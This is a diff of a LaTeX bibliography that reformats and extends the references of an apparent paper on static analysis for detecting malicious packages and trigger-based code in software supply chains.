-\bibitem{king} J.~C.~King, ``Symbolic execution and program testing,'' \emph{Commun. ACM}, vol.~19, no.~7, pp.~385--394, 1976.
-\bibitem{klee} C.~Cadar, D.~Dunbar, and D.~Engler, ``KLEE: Unassisted and automatic generation of high-coverage tests for complex systems programs,'' in \emph{Proc. OSDI}, 2008.
-\bibitem{dart} P.~Godefroid, N.~Klarlund, and K.~Sen, ``DART: Directed automated random testing,'' in \emph{Proc. PLDI}, 2005.
-\bibitem{sage} P.~Godefroid, M.~Y.~Levin, and D.~Molnar, ``Automated whitebox fuzz testing,'' in \emph{Proc. NDSS}, 2008.
-\bibitem{triggerscope} Y.~Fratantonio, A.~Bianchi, W.~Robertson, E.~Kirda, C.~Kruegel, and G.~Vigna, ``TriggerScope: Towards detecting logic bombs in Android applications,'' in \emph{Proc. IEEE S\&P}, 2016.
-\bibitem{cpg} F.~Yamaguchi, N.~Golde, D.~Arp, and K.~Rieck, ``Modeling and discovering vulnerabilities with code property graphs,'' in \emph{Proc. IEEE S\&P}, 2014.
-\bibitem{livshits} V.~B.~Livshits and M.~S.~Lam, ``Finding security vulnerabilities in Java applications with static analysis,'' in \emph{Proc. USENIX Security}, 2005.
-\bibitem{lyda} R.~Lyda and J.~Hamrock, ``Using entropy analysis to find encrypted and packed malware,'' \emph{IEEE Security \& Privacy}, vol.~5, no.~2, pp.~40--45, 2007.
-\bibitem{chessmcgraw} B.~Chess and G.~McGraw, ``Static analysis for security,'' \emph{IEEE Security \& Privacy}, vol.~2, no.~6, pp.~76--79, 2004.
-\bibitem{findbugs} N.~Ayewah, W.~Pugh, D.~Hovemeyer, J.~D.~Morgenthaler, and J.~Penix, ``Using static analysis to find bugs,'' \emph{IEEE Software}, vol.~25, no.~5, pp.~22--29, 2008.
-\bibitem{infer} D.~Distefano, M.~F\"ahndrich, F.~Logozzo, and P.~W.~O'Hearn, ``Scaling static analyses at Facebook,'' \emph{Commun. ACM}, vol.~62, no.~8, pp.~62--70, 2019.
-\bibitem{maloss} R.~Duan, O.~Alrawi, R.~P.~Kasturi, R.~Elder, B.~Saltaformaggio, and W.~Lee, ``Towards measuring supply chain attacks on package managers for interpreted languages,'' in \emph{Proc. NDSS}, 2021.
-\bibitem{lastpymile} D.-L.~Vu, F.~Massacci, I.~Pashchenko, H.~Plate, and A.~Sabetta, ``LastPyMile: Identifying the discrepancy between sources and packages,'' in \emph{Proc. ESEC/FSE}, 2021.
-\bibitem{sejfia} A.~Sejfia and M.~Sch\"afer, ``Practical automated detection of malicious npm packages,'' in \emph{Proc. ICSE}, 2022.
-\bibitem{intoto} S.~Torres-Arias, H.~Afzali, T.~K.~Kuppusamy, R.~Curtmola, and J.~Cappos, ``in-toto: Providing farm-to-table guarantees for bits and bytes,'' in \emph{Proc. USENIX Security}, 2019.
-\bibitem{taintdroid} W.~Enck \emph{et al.}, ``TaintDroid: An information-flow tracking system for realtime privacy monitoring on smartphones,'' in \emph{Proc. OSDI}, 2010.
-\bibitem{rice} H.~G.~Rice, ``Classes of recursively enumerable sets and their decision problems,'' \emph{Trans. Amer. Math. Soc.}, vol.~74, pp.~358--366, 1953.
-\bibitem{slsa} Open Source Security Foundation, ``SLSA: Supply-chain Levels for Software Artifacts,'' slsa.dev.
-\bibitem{sonatype} Sonatype, ``State of the Software Supply Chain,'' Annual report, 2024.
-\bibitem{guo} W.~Guo \emph{et al.}, ``An empirical study of malicious code in PyPI ecosystem,'' in \emph{Proc. IEEE/ACM ASE}, 2023.
-\bibitem{scholte} T.~Scholte, D.~Balzarotti, and E.~Kirda, ``Have things changed now? An empirical study on input validation vulnerabilities in web applications,'' \emph{Computers \& Security}, vol.~31, no.~3, pp.~344--356, 2012.
-\bibitem{backstab2} M.~Ohm, L.~Kempf, F.~Boes, and M.~Meier, ``Supporting the detection of software supply chain attacks through unsupervised signature generation,'' arXiv preprint, 2021.
+\bibitem{cwe} MITRE Corporation: Common Weakness Enumeration (CWE). cwe.mitre.org
+\bibitem{owasp} OWASP Foundation: OWASP Top 10 and Risk Rating Methodology. owasp.org
+\bibitem{attack} MITRE Corporation: ATT\&CK T1480.001 (Environmental Keying) and T1497 (Sandbox Evasion). attack.mitre.org
+\bibitem{bandit} PyCQA: Bandit, a security linter for Python. github.com/PyCQA/bandit
+\bibitem{semgrep} Semgrep Inc.: Semgrep, lightweight static analysis. semgrep.dev
+\bibitem{codeql} GitHub Inc.: CodeQL. codeql.github.com
+\bibitem{sarif} OASIS: Static Analysis Results Interchange Format (SARIF) v2.1.0. OASIS Standard (2020)
+\bibitem{z3} de Moura, L., Bj\o rner, N.: Z3, an efficient SMT solver. In: Proc. TACAS (2008)
+\bibitem{higuchi} Higuchi, T.: Approach to an irregular time series on the basis of the fractal theory. Physica D 31(2), 277--283 (1988)
+\bibitem{shannon} Shannon, C.E.: A mathematical theory of communication. Bell Syst. Tech. J. 27, 379--423 (1948)
+\bibitem{ohm} Ohm, M., Plate, H., Sykosch, A., Meier, M.: Backstabber's knife collection: a review of open source software supply chain attacks. In: Proc. DIMVA (2020)
+\bibitem{zimmermann} Zimmermann, M., Staicu, C.-A., Tenny, C., Pradel, M.: Small world with high risks: a study of security threats in the npm ecosystem. In: Proc. USENIX Security (2019)
+\bibitem{ladisa} Ladisa, P., Plate, H., Martinez, M., Barais, O.: SoK: taxonomy of attacks on open-source software supply chains. In: Proc. IEEE S\&P (2023)
+\bibitem{johnson} Johnson, B., Song, Y., Murphy-Hill, E., Bowdidge, R.: Why don't software developers use static analysis tools to find bugs? In: Proc. ICSE (2013)
+\bibitem{bessey} Bessey, A., et al.: A few billion lines of code later: using static analysis to find bugs in the real world. Commun. ACM 53(2), 66--75 (2010)
+\bibitem{christakis} Christakis, M., Bird, C.: What developers want and need from program analysis: an empirical study. In: Proc. ASE (2016)
+\bibitem{sadowski} Sadowski, C., Aftandilian, E., Eagle, A., Miller-Cushon, L., Jaspan, C.: Lessons from building static analysis tools at Google. Commun. ACM 61(4), 58--66 (2018)
+\bibitem{flowdroid} Arzt, S., et al.: FlowDroid: precise context, flow, field, object-sensitive and lifecycle-aware taint analysis for Android apps. In: Proc. PLDI (2014)
+\bibitem{pixy} Jovanovic, N., Kruegel, C., Kirda, E.: Pixy: a static analysis tool for detecting web application vulnerabilities. In: Proc. IEEE S\&P (2006)
+\bibitem{spracklen} Spracklen, J., et al.: We have a package for you! A comprehensive analysis of package hallucinations by code-generating LLMs. arXiv preprint (2024)
+\bibitem{brumley} Brumley, D., Hartwig, C., Liang, Z., Newsome, J., Song, D., Yin, H.: Automatically identifying trigger-based behavior in malware. In: Botnet Detection. Springer (2008)
+\bibitem{taintcheck} Newsome, J., Song, D.: Dynamic taint analysis for automatic detection, analysis, and signature generation of exploits on commodity software. In: Proc. NDSS (2005)
+\bibitem{schwartz} Schwartz, E.J., Avgerinos, T., Brumley, D.: All you ever wanted to know about dynamic taint analysis and forward symbolic execution (but might have been afraid to ask). In: Proc. IEEE S\&P (2010)
+\bibitem{nielson} Nielson, F., Nielson, H.R., Hankin, C.: Principles of Program Analysis. Springer (1999)
+\bibitem{vonneumann} von Neumann, J.: Mathematical Foundations of Quantum Mechanics. Princeton Univ. Press (1955)
+\bibitem{cvss} FIRST.org: Common Vulnerability Scoring System (CVSS) v3.1 Specification. first.org/cvss
+\bibitem{reports} Checkmarx, Phylum, Sonatype: Public threat reports on the W4SP stealer, aiocpa, and PyPI install-time payloads (2023--2025)
+\bibitem{gitguardian} GitGuardian: The State of Secrets Sprawl. Annual report (2025)
+\bibitem{pipaudit} Python Packaging Authority: pip-audit. github.com/pypa/pip-audit
+\bibitem{osv} Google: OSV-Scanner and the OSV vulnerability database. osv.dev
+\bibitem{king} King, J.C.: Symbolic execution and program testing. Commun. ACM 19(7), 385--394 (1976)
+\bibitem{klee} Cadar, C., Dunbar, D., Engler, D.: KLEE: unassisted and automatic generation of high-coverage tests for complex systems programs. In: Proc. OSDI (2008)
+\bibitem{dart} Godefroid, P., Klarlund, N., Sen, K.: DART: directed automated random testing. In: Proc. PLDI (2005)
+\bibitem{sage} Godefroid, P., Levin, M.Y., Molnar, D.: Automated whitebox fuzz testing. In: Proc. NDSS (2008)
+\bibitem{triggerscope} Fratantonio, Y., Bianchi, A., Robertson, W., Kirda, E., Kruegel, C., Vigna, G.: TriggerScope: towards detecting logic bombs in Android applications. In: Proc. IEEE S\&P (2016)
+\bibitem{cpg} Yamaguchi, F., Golde, N., Arp, D., Rieck, K.: Modeling and discovering vulnerabilities with code property graphs. In: Proc. IEEE S\&P (2014)
+\bibitem{livshits} Livshits, V.B., Lam, M.S.: Finding security vulnerabilities in Java applications with static analysis. In: Proc. USENIX Security (2005)
+\bibitem{lyda} Lyda, R., Hamrock, J.: Using entropy analysis to find encrypted and packed malware. IEEE Secur. Priv. 5(2), 40--45 (2007)
+\bibitem{chessmcgraw} Chess, B., McGraw, G.: Static analysis for security. IEEE Secur. Priv. 2(6), 76--79 (2004)
+\bibitem{findbugs} Ayewah, N., Pugh, W., Hovemeyer, D., Morgenthaler, J.D., Penix, J.: Using static analysis to find bugs. IEEE Softw. 25(5), 22--29 (2008)
+\bibitem{infer} Distefano, D., F\"ahndrich, M., Logozzo, F., O'Hearn, P.W.: Scaling static analyses at Facebook. Commun. ACM 62(8), 62--70 (2019)
+\bibitem{maloss} Duan, R., Alrawi, O., Kasturi, R.P., Elder, R., Saltaformaggio, B., Lee, W.: Towards measuring supply chain attacks on package managers for interpreted languages. In: Proc. NDSS (2021)
+\bibitem{lastpymile} Vu, D.-L., Massacci, F., Pashchenko, I., Plate, H., Sabetta, A.: LastPyMile: identifying the discrepancy between sources and packages. In: Proc. ESEC/FSE (2021)
+\bibitem{sejfia} Sejfia, A., Sch\"afer, M.: Practical automated detection of malicious npm packages. In: Proc. ICSE (2022)
+\bibitem{intoto} Torres-Arias, S., Afzali, H., Kuppusamy, T.K., Curtmola, R., Cappos, J.: in-toto: providing farm-to-table guarantees for bits and bytes. In: Proc. USENIX Security (2019)
+\bibitem{taintdroid} Enck, W., et al.: TaintDroid: an information-flow tracking system for realtime privacy monitoring on smartphones. In: Proc. OSDI (2010)
+\bibitem{rice} Rice, H.G.: Classes of recursively enumerable sets and their decision problems. Trans. Amer. Math. Soc. 74, 358--366 (1953)
+\bibitem{slsa} Open Source Security Foundation: SLSA, Supply-chain Levels for Software Artifacts. slsa.dev
+\bibitem{sonatype} Sonatype: State of the Software Supply Chain. Annual report (2024)
+\bibitem{guo} Guo, W., et al.: An empirical study of malicious code in PyPI ecosystem. In: Proc. IEEE/ACM ASE (2023)
+\bibitem{scholte} Scholte, T., Balzarotti, D., Kirda, E.: Have things changed now? An empirical study on input validation vulnerabilities in web applications. Comput. Secur. 31(3), 344--356 (2012)
+\bibitem{backstab2} Ohm, M., Kempf, L., Boes, F., Meier, M.: Supporting the detection of software supply chain attacks through unsupervised signature generation. arXiv preprint (2021)
 \end{thebibliography}
 
 \end{document}
